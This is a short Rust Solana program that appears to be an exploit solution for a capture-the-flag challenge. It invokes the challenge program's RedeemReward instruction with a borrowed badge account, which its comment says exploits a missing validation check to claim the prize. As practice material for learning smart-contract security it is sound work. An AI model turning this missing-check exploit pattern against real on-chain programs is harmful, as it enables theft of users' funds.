use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::invoke,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    let mut iter = accounts.iter();
    let player = next_account_info(&mut iter)?;
    let badge_mint = next_account_info(&mut iter)?;
    let borrowed_badge = next_account_info(&mut iter)?;
    let prize = next_account_info(&mut iter)?;
    let challenge_program = next_account_info(&mut iter)?;

    // Missing check → we can redeem with the borrowed badge
    invoke(
        &Instruction {
            program_id: *challenge_program.key,
            accounts: vec![
                AccountMeta::new(*player.key, true),                 // player
                AccountMeta::new_readonly(*badge_mint.key, false),   // badge mint
                AccountMeta::new_readonly(*borrowed_badge.key, false), // borrowed badge
                AccountMeta::new(*prize.key, false),                 // prize
            ],
            data: vec![0], // RedeemReward
        },
        &[
            player.clone(),
            badge_mint.clone(),
            borrowed_badge.clone(),
            prize.clone(),
            challenge_program.clone(),
        ],
    )
}